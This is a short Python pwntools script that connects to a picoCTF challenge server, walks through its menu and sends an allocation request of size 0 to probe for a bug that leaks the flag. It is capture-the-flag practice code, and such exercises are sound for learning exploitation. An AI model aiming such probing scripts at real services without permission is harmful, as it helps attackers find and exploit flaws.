#!/usr/bin/env python3

from pwn import *

p = remote('jupiter.challenges.picoctf.org', 29476)

# Get to menu
p.recvuntil(b'So, you want to be a hero?')
p.sendline(b'y')
data = p.recvuntil(b'>')

print(f"Got: {data}")

# Try allocating with size 0
p.sendline(b'1')
p.recvuntil(b'length')
p.sendline(b'0')

try:
    resp = p.recv(1024, timeout=2)
    print(f"Response to size 0: {resp}")
    
    if b'picoCTF' in resp:
        print("FLAG FOUND!")
except:
    pass

p.interactive()